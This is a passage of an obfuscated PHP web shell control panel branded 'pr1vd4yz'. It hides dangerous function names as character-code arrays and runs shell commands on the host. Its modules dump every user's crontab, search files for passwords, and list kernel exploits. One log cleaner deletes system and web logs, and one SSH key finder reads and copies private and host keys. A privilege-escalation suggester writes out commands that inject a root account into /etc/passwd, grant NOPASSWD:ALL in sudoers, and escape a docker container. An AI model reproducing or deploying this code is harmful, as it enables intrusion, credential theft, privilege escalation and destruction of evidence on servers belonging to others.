$_fx=[_prv_str([101,120,101,99]),_prv_str([115,121,115,116,101,109]),_prv_str([112,97,115,115,116,104,114,117])];
foreach($_fx as$_f){if(function_exists($_f)){@$_f($c);$_o="";if($_o)return$_o;}}return!1;}}
if($_rt){echo'<pre class="pr1vd4yz-cronmodal-code">'.htmlspecialchars($_rt).'</pre>';}else{$_rs=_prv_rx_j9q('crontab -l 2>&1');echo'<pre class="pr1vd4yz-cronmodal-code">'.htmlspecialchars($_rs).'</pre>';}
echo'</div>';
$_us=[];$_pf=@file('/etc/passwd');
if($_pf){foreach($_pf as$_l){$_ps=explode(':',$_l);if(isset($_ps[6])&&(strpos($_ps[6],'bash')!==!1||strpos($_ps[6],'sh')!==!1)){$_us[]=$_ps[0];}}}
foreach($_us as$_u){if($_u=='root')continue;$_p1="/var/spool/cron/$_u";$_p2="/var/spool/cron/crontabs/$_u";$_cr='';if(file_exists($_p1))$_cr=@$_fc($_p1);elseif(file_exists($_p2))$_cr=@$_fc($_p2);else$_cr=_prv_rx_j9q("crontab -u $_u -l 2>&1");echo'<div class="pr1vd4yz-cronmodal-section">';echo'<div class="pr1vd4yz-cronmodal-user">'.$_u.'</div>';echo'<pre class="pr1vd4yz-cronmodal-code">'.htmlspecialchars(trim($_cr)? : '[empty]').'</pre>';echo'</div>';}
?>

    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['fsearch'])): ?>
<?php
function pdz_fsearch($keyword, $root, $maxfiles = 1500, $maxhits = 400) {
    $results = [];
    $queue = [rtrim($root, "/")];
    $checked = 0; $hits = 0;

    while ($queue && $checked < $maxfiles && $hits < $maxhits) {
        $dir = array_shift($queue);
        if (!is_dir($dir) || !is_readable($dir)) continue;
        $dh = @opendir($dir);
        if (!$dh) continue;

        while (($f = @readdir($dh)) !== false) {
            if ($f === '.' || $f === '..') continue;
            $p = $dir . '/' . $f;
            if (is_dir($p) && is_readable($p)) {
                $queue[] = $p;
            }
            else if (is_file($p) && is_readable($p)) {
                $checked++;
                $size = @filesize($p);
                if ($size === false || $size > 10*1024*1024) continue;
                $chk = @file_get_contents($p, false, null, 0, 512);
                if ($chk !== false && preg_match('/[\x00-\x08\x0B\x0E-\x1F]/', $chk)) continue;
                $lines = @file($p);
                if (!$lines) continue;
                foreach ($lines as $lnum => $line) {
                    if (stripos($line, $keyword) !== false) {
                        $results[] = [
                            'file' => $p,
                            'line' => $lnum+1,
                            'content' => trim($line)
                        ];
                        $hits++;
                        if ($hits >= $maxhits) break 2;
                    }
                }
            }
        }
        @closedir($dh);
    }
    return $results;
}
?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:700px;">
    <div class="pr1vd4yz-modal-header-wiz">
      <div class="pr1vd4yz-wiz-icon" style="background:#ff3939;"><i class="fas fa-search"></i></div>
      <div>
        <div class="pr1vd4yz-wiz-title">file search</div>
      </div>
      <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-form" style="margin-bottom:6px;">
      <div class="pr1vd4yz-wiz-section" style="padding-bottom:2px;">
        <div class="pr1vd4yz-wiz-fields" style="gap: 10px;">
          <input type="text" name="search_kw" class="pr1vd4yz-wiz-input" placeholder="keyword (e.g. config, password, mail)" required>
          <input type="text" name="search_path" class="pr1vd4yz-wiz-input" value="<?= htmlspecialchars(getcwd(), ENT_QUOTES) ?>" placeholder="path to search" required>
        </div>
      </div>
      <div class="pr1vd4yz-modal-actions-wiz">
        <button type="submit" name="search-file" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red"><i class="fas fa-search"></i> search</button>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
          <i class="fas fa-times"></i> close
        </a>
      </div>
    </form>
    <?php
    if (isset($_POST['search-file'], $_POST['search_kw'], $_POST['search_path'])) {
      $kw = trim($_POST['search_kw']);
      $sp = trim($_POST['search_path']);
      $out = pdz_fsearch($kw, $sp, 1800, 350);

      echo '<div class="pr1vd4yz-searchmodal-box">';
      if ($out && count($out) > 0) {
        $shown = 0;
        foreach ($out as $res) {
          $shown++;
          $icon = "<i class='fa-regular fa-file pr1vd4yz-search-ico' style='color:#e53935;'></i>";
          echo '<div class="pr1vd4yz-search-row">';
          echo $icon;
          echo '<span style="color:#ff3939;">' . htmlspecialchars(basename($res['file'])) . '</span> ';
          echo '<span style="color:#b71c1c;font-size:.91em;">[' . htmlspecialchars(dirname($res['file'])) . ']</span> ';
          echo '<span class="pr1vd4yz-search-lnum">#' . $res['line'] . '</span>: ';
          echo '<span class="pr1vd4yz-search-snip">' . htmlspecialchars($res['content']) . '</span>';
          echo '</div>';
          if ($shown >= 120) break;
        }
        if ($shown >= 120) echo '<div style="font-size:.95em;color:#b71c1c;text-align:center;">Result limit reached.</div>';
      } else {
        echo '<div class="pr1vd4yz-search-nores">No results found!</div>';
      }
      echo '</div>';
    }
    ?>
  </div>
</div>

<?php endif; ?>

<?php if (isset($_GET['kernelcheck'])):
function try_all_methods($commands, $limit = 1) {
    $results = [];
    foreach ($commands as $key => $cmd) {
     if (function_exists('pr1vd4yzC')) {
       $out = trim(@pr1vd4yzC($cmd));
       if ($out && !in_array($out, $results)) $results[] = $out;
     }
     if (count($results) >= $limit) break;
    }
    return count($results) ? $results[0] : "";
}
$kernel = try_all_methods([
    'uname -r',
    'cat /proc/version',
    'cat /proc/sys/kernel/osrelease',
    'cat /etc/os-release | grep VERSION=',
    'cat /etc/issue'
]);

$arch = try_all_methods([
    'uname -m',
    'arch',
    'cat /proc/cpuinfo | grep -i "model name"'
]);

$un7xa = try_all_methods([
    'uname -a',
    'cat /proc/version',
    'cat /etc/issue'
]);
if (!$kernel) $kernel = $un7xa;
if (!$arch) $arch = php_uname('m');
if (!$un7xa) $un7xa = php_uname();
$edb_url = "https://www.exploit-db.com/search?cve=&q=" . urlencode($kernel);
$ps_url = "https://packetstormsecurity.com/search/?q=" . urlencode($kernel);
$edb_uname_url = "https://www.exploit-db.com/search?cve=&q=" . urlencode($un7xa);
$ps_uname_url = "https://packetstormsecurity.com/search/?q=" . urlencode($un7xa);

?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-bug"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">kernel exploit checker</div>
     <div class="pr1vd4yz-wiz-desc" style="font-size:.99em;">Quick exploit search for this system</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div class="pr1vd4yz-kernel-modal">
    <div class="pr1vd4yz-kernelresult">
     <div class="pr1vd4yz-krow">Kernel: <?= htmlspecialchars($kernel) ?> <span class="pr1vd4yz-kbadge"><?= htmlspecialchars($arch) ?></span></div>
     <div class="pr1vd4yz-krow">Full uname: <code style="color:#666;"><?= htmlspecialchars($un7xa) ?></code></div>
     <div class="pr1vd4yz-krow" style="display:flex;gap:9px;flex-wrap:wrap;">
       <a href="<?= $edb_url ?>" target="_blank" class="pr1vd4yz-kbadge pr1vd4yz-kbadge-red"><i class="fas fa-bug"></i> Exploit-DB (kernel)</a>
       <a href="<?= $ps_url ?>" target="_blank" class="pr1vd4yz-kbadge pr1vd4yz-kbadge-orange"><i class="fas fa-bug"></i> Packetstorm (kernel)</a>
     </div>
     <div class="pr1vd4yz-krow" style="display:flex;gap:9px;flex-wrap:wrap;">
       <a href="<?= $edb_uname_url ?>" target="_blank" class="pr1vd4yz-kbadge pr1vd4yz-kbadge-red"><i class="fas fa-bug"></i> Exploit-DB (uname)</a>
       <a href="<?= $ps_uname_url ?>" target="_blank" class="pr1vd4yz-kbadge pr1vd4yz-kbadge-orange"><i class="fas fa-bug"></i> Packetstorm (uname)</a>
     </div>
    </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php
if (isset($_GET['apiscan']) || isset($_POST['pr1vd4yz_apiscan_path'])):
if(isset($_GET[_prv_str([97,112,105,115,99,97,110])])||isset($_POST[_prv_str([112,114,49,118,100,52,121,122,95,97,112,105,115,99,97,110,95,112,97,116,104])])){
$_scpath=_prv_str([115,99,97,110,95,112,97,116,104]);
$_getcwd=_prv_str([103,101,116,99,119,100]);
$path=isset($_POST[$_scpath])?$_POST[$_scpath]:@$_getcwd();
$scan_result='';
if(!empty($_POST[_prv_str([112,114,49,118,100,52,121,122,95,97,112,105,115,99,97,110,95,112,97,116,104])])){
$scanpath=trim($_POST[$_scpath]);
$_isdir=_prv_str([105,115,95,100,105,114]);
if(!$scanpath||!@$_isdir($scanpath)){
$scan_result='<div class="pr1vd4yz-apirow" style="color:#e53935;">Directory not found or invalid path!</div>';
}else{
$_glob=_prv_str([103,108,111,98]);
$_rt=_prv_str([114,116,114,105,109]);
$_fc=_prv_str([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$_bn=_prv_str([98,97,115,101,110,97,109,101]);
$files=@$_glob(@$_rt($scanpath,'/').'/*.{php,js,py,sh,conf,txt,inc}',1024);
$result=[];$regex=[
'#(/[a-zA-Z0-9_\-\.]+){2,}#',
'#\?([a-zA-Z0-9\_\-]+)=#',
'#["\'](https?://[^\s\'"]+)["\']#',
'#[\'"](/[a-zA-Z0-9_\-]+/[a-zA-Z0-9_\-/]+)[\'"]#',
'#[\'"]((?:api|rest|endpoint|ws)[^\'"]+)[\'"]#i'
];
foreach($files as$file){
$content=@$_fc($file);$hits=[];
foreach($regex as$r){
if(preg_match_all($r,$content,$m)){
foreach(($m[1]??$m[0])as$u){
$u=trim($u,'"\' ');
if(strlen($u)>4&&!in_array($u,$hits))$hits[]=$u;}}}
if($hits)$result[]=['file'=>@$_bn($file),'hits'=>$hits];
}
$scan_result='<divclass="pr1vd4yz-apilistbox">';
if(!$result){
$scan_result.='<div class="pr1vd4yz-apirow" style="color:#e53935;">No endpoint found in this directory.</div>';
}else{
foreach($result as$row){
$scan_result.='<div class="pr1vd4yz-apirow">'.$row['file'].'<ul class="pr1vd4yz-apiul">';
foreach($row['hits']as$h){
$scan_result.='<li class="pr1vd4yz-apihit">'.htmlspecialchars($h).'</li>';}
$scan_result.='</ul></div>';
}}
$scan_result.='</div>';
}}
}
?>
?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-search-location"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">api endpoint scanner</div>
     <div class="pr1vd4yz-wiz-desc">Scan all PHP, JS, conf, py, sh files in any directory for endpoints.</div>
    </div>
  <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div class="pr1vd4yz-apimodal">
    <form id="pr1vd4yz-apiform" class="pr1vd4yz-apiform" method="post" autocomplete="off">
     <input type="text" name="scan_path" id="pr1vd4yz-apipath" class="pr1vd4yz-apipath" value="<?= htmlspecialchars($path) ?>">
     <input type="hidden" name="pr1vd4yz_apiscan_path" value="1">
     <button type="submit" class="pr1vd4yz-apibtn"><i class="fas fa-search"></i> Scan</button>
    </form>
    <div id="pr1vd4yz-apilistbox" class="pr1vd4yz-apilistbox" style="text-align:center;">
     <?= $scan_result ?: '<span style="opacity:.7;">No scan yet.</span>' ?>
    </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php
$f4k2u=_prv_str([117,110,108,105,110,107]); 
$fy81d=_prv_str([102,105,108,101,95,112,117,116,95,99,111,110,116,101,110,116,115]); 
$fr03c=_prv_str([102,111,112,101,110]); 
$fz9s1=_prv_str([115,104,101,108,108,95,101,120,101,99]); 
$f3vdq=_prv_str([115,121,115,116,101,109]);
$fxn7v=_prv_str([101,115,99,97,112,101,115,104,101,108,108,97,114,103]); 
$f7t1c=_prv_str([105,115,95,102,105,108,101]); 
$f9r5w=_prv_str([102,105,108,101,115,105,122,101]); 
$fek6z=_prv_str([103,101,116,99,119,100]); 
$fsb2k=_prv_str([103,108,111,98]); 
$f41aa=_prv_str([98,97,115,101,110,97,109,101]);

$log_patterns=['error_log','access_log','debug.log','php_error.log','error.log','log.txt','/logs/*.log','/logs/*.txt','/log/*.log','/var/log/*log','/var/log/*/*.log','/var/log/httpd/*','/var/log/nginx/*','/usr/local/apache/logs/*log','/usr/local/cpanel/logs/*','/usr/local/lxlabs/kloxo/log/*','/var/log/plesk/*','C:\Windows\System32\LogFiles\*'];

$zap = function($p) use($f4k2u,$fz9s1,$f3vdq,$fxn7v,$f7t1c,$fy81d,$fr03c) {
    $succ=0;
    if(@$f4k2u($p)) $succ=1;
    elseif(@is_callable($fz9s1)&&@$fz9s1('rm -f '.$fxn7v($p))&&!@$f7t1c($p)) $succ=1;
    elseif(@is_callable($f3vdq)&&@$f3vdq('rm -f '.$fxn7v($p))&&!@$f7t1c($p)) $succ=1;
    elseif(@$fy81d($p,'')!==false) $succ=1;
    else{ $h=@$fr03c($p,'w'); if($h){@fclose($h);$succ=1;} }
    return $succ;
};

$fmt = function($n){
    if($n<1024) return $n.' B';
    if($n<1024*1024) return round($n/1024,1).' KB';
    if($n<1024*1024*1024) return round($n/1024/1024,1).' MB';
    return round($n/1024/1024/1024,1).' GB';
};
?>
<?php if (isset($_GET['logclean']) || isset($_POST['pr4vdlogclean'])):?>
<?php
$scan_result = '';
if (isset($_POST[_prv_str([112,114,52,118,100,108,111,103,99,108,101,97,110])])) {
    $clean=isset($_POST['delete'])?$_POST['delete']:null;
    $found = [];
    foreach($log_patterns as $pat){
    $g=(strpos($pat,'*')!==false)?@$fsb2k($pat):@$fsb2k($fek6z().'/'.$pat);
    if(!$g)continue;
    foreach($g as $f){
     if(!$f7t1c($f)) continue;
     $size=@$f9r5w($f);$found[$f]=$size;
    }
    }
    $scan_result = '<div class="pr1vd4yz-loglist">';
    if($clean && isset($found[$clean])){
    $del = $zap($clean);
    $scan_result .= '<div class="pr1vd4yz-logrow" style="color:'.($del?'#10b981':'#e53935').';">'.htmlspecialchars($f41aa($clean)).' : '.($del?'done!':'Delete failed!').'</div>';
    unset($found[$clean]);
    }
    if(!$found && !$clean){
    $scan_result .= '<div class="pr1vd4yz-logrow" style="color:#e53935;">no l0gs.</div>';
    } else {
    foreach($found as $file=>$size){
     $scan_result .= '<div class="pr1vd4yz-logrow">'.htmlspecialchars($f41aa($file)).' <span class="pr1vd4yz-logsize">'.$fmt($size).'</span>
       <form method="post" style="display:inline;">
       <input type="hidden" name="pr4vdlogclean" value="1">
       <input type="hidden" name="delete" value="'.htmlspecialchars($file).'">
       <button class="pr1vd4yz-logbtn" type="submit"><i class="fas fa-trash"></i> del</button>
       </form>
     </div>';
    }
    }
    $scan_result .= '</div>';
}
?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-broom"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">log cleaner</div>
     <div class="pr1vd4yz-wiz-desc">Find and delete all error/access/debug logs for every server type</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>

    </div>
    <div class="pr1vd4yz-logmodal"><form method="post" style="margin-bottom:2px;">
     <input type="hidden" name="pr4vdlogclean" value="1">
     <button type="submit" class="pr1vd4yz-logbtn" style="margin-bottom:14px;"><i class="fas fa-search"></i>Scan Logs</button>
    </form>
    <div id="pr1vd4yz-loglist">
     <?= $scan_result ?: '<span style="opacity:.7;">No scan yet.</span>' ?>
    </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php
$p4z_f1 = _prv_str([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$p4z_f2 = _prv_str([105,115,95,114,101,97,100,97,98,108,101]);
$p4z_f3 = _prv_str([105,115,95,102,105,108,101]);
$p4z_sc = _prv_str([115,99,97,110,100,105,114]);
$p4z_bn = _prv_str([98,97,115,101,110,97,109,101]);
$p4z_sz = _prv_str([102,105,108,101,115,105,122,101]);
$p4z_gv = _prv_str([103,101,116,101,110,118]);
$p4z_gl = _prv_str([103,108,111,98]);
function p4z_f1x($p){global $p4z_f1;return @$p4z_f1($p);}
function p4z_f2x($p){global $p4z_f2;return $p4z_f2($p);}
function p4z_f3x($p){global $p4z_f3;return @$p4z_f3($p);}
function p4z_rec($dir,$d=0){
  global $p4z_sc, $p4z_f3, $p4z_f2, $p4z_sz;
  $r=[];
  if($d>2)return$r;
  $scan=@$p4z_sc($dir);
  if(!$scan)return$r;
  foreach($scan as$f){
    if($f=='.'||$f=='..')continue;
    $fp=$dir.'/'.$f;
    if(@$p4z_f3($fp)&&@$p4z_f2($fp)&&preg_match('/(id_rsa|id_dsa|id_ed25519|id_ecdsa|authorized_keys|ssh_config|known_hosts|config|.pem|.ppk|ssh2_config)/i',$f)){
    $r[$fp]=@$p4z_sz($fp);
    }
    if(@is_dir($fp))$r+=p4z_rec($fp,$d+1);
  }
  return$r;
}
function p4z_homes(){
  global $p4z_sc;
  $r=[];
  foreach(['/home','/home2','/home3','/root','/etc/ssh','/var/lib/jenkins','/var/backups','/usr/local/directadmin/data/users','/var/www','/var/www/vhosts']as$h){
    if(@is_dir($h)){
    foreach(@$p4z_sc($h)?:[]as$u){
     if($u=='.'||$u=='..')continue;
     $ud="$h/$u";
     if(@is_dir($ud))$r[]=$ud;
    }
    }
  }
  global $p4z_gv;
  $r[]=@$p4z_gv('HOME')?:'/root';
  return array_unique($r);
}
function p4z_size($s){
  if($s<1024)return$s.' B';
  if($s<1024*1024)return round($s/1024,1).' KB';
  return round($s/1024/1024,1).' MB';
}
$ssh_found=[];$show='';
if(isset($_POST['p4zsshscan'])){
  $d1Xe=p4z_homes();
  $searched=[];
  foreach($d1Xe as$dir){
    foreach(['.ssh','ssh','config','.config','']as$d){
    $path=$dir.($d?"/$d":"");
    if(@is_dir($path))$searched+=p4z_rec($path,0);
    }}
  foreach(['/tmp','/var/tmp','/usr/local/apache2/conf','/var/www','/etc/letsencrypt','/etc/nginx','/etc/apache2','/opt','/etc/ssl']as$p){
    if(@is_dir($p))$searched+=p4z_rec($p,1);
  }
  foreach(['/etc/ssh/ssh_host_rsa_key','/etc/ssh/ssh_host_dsa_key','/etc/ssh/ssh_host_ecdsa_key','/etc/ssh/ssh_host_ed25519_key']as$p){
    if(@file_exists($p)&&p4z_f2x($p))$searched[$p]=@$p4z_sz($p);
  }
  foreach(@$p4z_gl('/home*/cpbackup/daily/*/etc/*/.ssh/*')?:[]as$p){
    if(p4z_f3x($p)&&p4z_f2x($p))$searched[$p]=@$p4z_sz($p);
  }
  $ssh_found=$searched;
  if(isset($_POST['showkey'])&&isset($ssh_found[$_POST['showkey']])){
    $k=$_POST['showkey'];
    $show='<div class="pr1vd4yz-keybox">'.htmlspecialchars($p4z_bn($k)).'
    <textarea class="pr1vd4yz-keyarea" readonly>'.trim(p4z_f1x($k)).'</textarea>
    <button type="button" class="pr1vd4yz-keycopy" onclick="navigator.clipboard.writeText(document.querySelector(\'.pr1vd4yz-keyarea\').value);this.innerText=\'copied!\';setTimeout(()=>this.innerText=\'copy\',1300)">copy</button>
    </div>';
  }
}
?>
<?php if (isset($_GET['sshkey']) || isset($_POST['p4zsshscan'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-key"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">ssh key finder</div>
     <div class="pr1vd4yz-wiz-desc">Deep scan: find, view, and copy all ssh keys & authorized_keys</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div class="pr1vd4yz-keymodal">
    <form method="post" style="margin-bottom:7px;">
     <input type="hidden" name="p4zsshscan" value="1">
     <button type="submit" class="pr1vd4yz-keybtn" style="margin-bottom:14px;"><i class="fas fa-search"></i>Scan SSH Keys</button>
    </form>
    <?= $show ?>
    <div class="pr1vd4yz-keylist">
    <?php
     if(isset($_POST['p4zsshscan']) && $ssh_found){
       foreach($ssh_found as $file=>$size){
       echo '<div class="pr1vd4yz-keyrow">'.htmlspecialchars(basename($file)).'
       <span class="pr1vd4yz-keysize">'.p4z_size($size).'</span>
       <form method="post" style="display:inline;">
        <input type="hidden" name="p4zsshscan" value="1">
        <input type="hidden" name="showkey" value="'.htmlspecialchars($file).'">
        <button type="submit" class="pr1vd4yz-keybtn"><i class="fas fa-eye"></i>View</button>
       </form>
       </div>';
       }
     } else if(isset($_POST['p4zsshscan'])) {
       echo '<div style="color:#e53935;opacity:.92;font-size:1.1em;padding:10px 0 8px 0;">No SSH keys or authorized_keys found anywhere.</div>';
     } else {
       echo '<span style="opacity:.7;">No scan yet.</span>';
     }
    ?>
    </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['rootsuggest'])): ?>
<?php
function pz_rnd($n=9) {
    $a='abcdefghijklmnopqrstuvwxyz'; $s='';
    for($i=0;$i<$n;$i++) $s.=$a[rand(0,25)];
    return $s;
}
function pz_exists($b) { return !!pr1vd4yzC("command -v $b"); }
function pz_writable($f) { return is_writable($f);}
function pz_infile($a, $s) {return strpos($a, $s)!==false;}

$pr1vd4yz_c0m_data = [];
$un7xa   = pr1vd4yzC('uname -a');
$whoami  = pr1vd4yzC('whoami');
$kernel  = pr1vd4yzC('uname -r');
$os = '';
if (file_exists('/etc/os-release')) $os = trim(@file_get_contents('/etc/os-release'));
if (!$os && file_exists('/etc/lsb-release')) $os = trim(@file_get_contents('/etc/lsb-release'));
$distro  = pr1vd4yzC('cat /etc/*release 2>/dev/null | grep PRETTY_NAME | head -n1');
if (!$distro) $distro = pr1vd4yzC('lsb_release -ds 2>/dev/null');
if (!$distro) $distro = pr1vd4yzC('cat /etc/issue 2>/dev/null | head -n1');
$users   = pr1vd4yzC('cut -d: -f1 /etc/passwd');
$sudo    = pr1vd4yzC('sudo -l 2>/dev/null');
$groups  = pr1vd4yzC('id');
$crontab = pr1vd4yzC('crontab -l 2>/dev/null');
$w_passwd = pz_writable('/etc/passwd');
$w_shadow = pz_writable('/etc/shadow');
$w_sudoers = pz_writable('/etc/sudoers');
$docker = file_exists('/.dockerenv') || pz_infile(pr1vd4yzC('cat /proc/1/cgroup 2>/dev/null'), 'docker') ? 'yes' : 'no';

$panel = '';
foreach(['cpanel','plesk','directadmin','ispconfig','webmin','virtualmin','hestia','cockpit','proxmox'] as $x)
    if(pz_exists($x)) $panel.=$x.' ';
$panel = trim($panel);
$cap = pr1vd4yzC('getcap -r / 2>/dev/null | grep "=" | head -n10');
$setuid = pr1vd4yzC('find / -perm -4000 -type f 2>/dev/null | head -n10');
$binaries = [];
foreach(['python3','perl','gcc','socat','awk','vim','nano','less','tar','find','curl','wget','busybox','openssl','docker','runc','base64','vi','nmap','mysql','psql'] as $b)
    if(pz_exists($b)) $binaries[]=$b;

$ai_exploits = [];
$pr1vd4yz_c0med = (pr1vd4yzC('id -u')=='0');
$kernel_sug = [];
if(preg_match('/5\.10\./', $kernel)) $kernel_sug[] = [
    'name'=>'DirtyPipe','desc'=>'Kernel 5.8+ (esp 5.10, 5.15) affected by CVE-2022-0847.','exploit'=>'https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit'
];
if(preg_match('/(3\.10|4\.4|4\.8|4\.15|5\.4|5\.8)/', $kernel)) $kernel_sug[] = [
    'name'=>'DirtyCow/PwnKit/OverlayFS',
    'desc'=>'Multiple local kernel exploits may be available. Search ExploitDB.',
    'exploit'=>'https://www.exploit-db.com/search?keywords=linux+kernel+'.$kernel
];
if(preg_match('/(ubuntu|debian|almalinux|rocky|centos)/i', $os.$distro)) $kernel_sug[] = [
    'name'=>'OS-specific Exploits',
    'desc'=>'Check local privilege escalation exploits for this distro.',
    'exploit'=>'https://www.exploit-db.com/search?keywords='.urlencode($distro)
];
$sudo_sug = [];
if(stripos($sudo, 'NOPASSWD')!==false || stripos($sudo, 'ALL')!==false) {
    foreach(['python3','perl','tar','awk','find','vim','less','vi','nano','bash','sh','nmap'] as $b)
    if(in_array($b, $binaries))
     $sudo_sug[]=[
       'name'=>"GTFOBins: sudo $b",
       'desc'=>"This binary is allowed as root with NOPASSWD, possible shell via GTFOBins.",
       'exploit'=>"https://gtfobins.github.io/gtfobins/$b/",
       'cmd'=>"sudo $b ..."
     ];
}
$writable_sug=[];
if($w_passwd) $writable_sug[]=[
  'name'=>'Writable /etc/passwd',
  'desc'=>'Overwrite root hash and escalate via passwd injection.',
  'exploit'=>'https://www.exploit-db.com/exploits/26368',
  'cmd'=>"echo 'root:\$1\$pr1vd4yz_c0m\$UOxzb7h8zS9E/::0:0:root:/root:/bin/bash' >> /etc/passwd"
];
if($w_shadow) $writable_sug[]=[
  'name'=>'Writable /etc/shadow',
  'desc'=>'Direct hash injection possible, root hash replacement.',
  'exploit'=>'https://www.exploit-db.com/exploits/45010'
];
if($w_sudoers) $writable_sug[]=[
  'name'=>'Writable /etc/sudoers',
  'desc'=>'Escalate to root via custom sudo rule.',
  'exploit'=>'https://gtfobins.github.io/gtfobins/sudo/',
  'cmd'=>'echo "ALL ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
];
$docker_sug = [];
if($docker==='yes')
    $docker_sug[]=[
    'name'=>'Docker/LXC Detected',
    'desc'=>'Escape possible if privileged container.',
    'exploit'=>'https://www.exploit-db.com/exploits/47103',
    'cmd'=>'docker run -v /:/host -it alpine chroot /host sh'
    ];
$cron_sug = [];
if($crontab && (pz_infile($crontab, '/tmp')||pz_infile($crontab, '/dev/shm')))
    $cron_sug[]=[
    'name'=>'Writable Cron',
    'desc'=>'Writable path detected in crontab. Priv esc via malicious cron job.',
    'exploit'=>'https://www.hackingarticles.in/linux-privilege-escalation-cron-jobs/'
    ];
$bin_sug = [];
foreach(['python3','perl','awk','find','tar','vim','less','nmap','busybox'] as $b){
  if(in_array($b,$binaries))
    $bin_sug[]=[
    'name'=>'GTFOBins: '.$b,
    'desc'=>'Privilege escalation possible via GTFOBins binary.',
    'exploit'=>'https://gtfobins.github.io/gtfobins/'.$b.'/'
    ];
}
$setuid_sug = [];
if($setuid)$setuid_sug[]=[
    'name'=>'SetuidBinaries',
    'desc'=>'Some setuid binaries may allow priv esc. Review carefully.',
    'exploit'=>'https://gtfobins.github.io/'
    ];
if($cap)
    $setuid_sug[]=[
    'name'=>'File Capabilities',
    'desc'=>'Some files have Linux capabilities. Review for priv esc.',
    'exploit'=>'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities'
    ];
$panel_sug = [];
if($panel) $panel_sug[]=[
    'name'=>'Panel(s) detected: '.$panel,
    'desc'=>'Check known panel local exploits and backup files.',
    'exploit'=>'https://www.exploit-db.com/search?keywords='.$panel
];
$ai_exploits = array_merge(
  $kernel_sug,
  $sudo_sug,
  $writable_sug,
  $docker_sug,
  $cron_sug,
  $bin_sug,
  $setuid_sug,
  $panel_sug
);

$badge=function($txt,$c){
    return "<span style=\"background:$c;color:#fff;border-radius:5px;padding:2px 8px;font-size:.93em;margin-left:5px;vertical-align:middle;\">$txt</span>";
};
?>
<div class="pr1vd4yz-modal-bg" style="z-index:1112;">
  <div class="pr1vd4yz-root-modal">
    <div class="pr1vd4yz-root-header" style="position:relative;">
    <div class="pr1vd4yz-root-ico"><i class="fas fa-brain-circuit"></i></div>
    <div>
     <div class="pr1vd4yz-root-tit">root escalation suggestion</div>
     <div class="pr1vd4yz-root-desc">ai-powered, kernel+distro+binary+sudo+writable+docker+panel+cron+setuid, fully automated & ready for 2025+</div>
    </div>
    <span class="pr1vd4yz-root-badge-ai">pr1vd4yz ai</span>
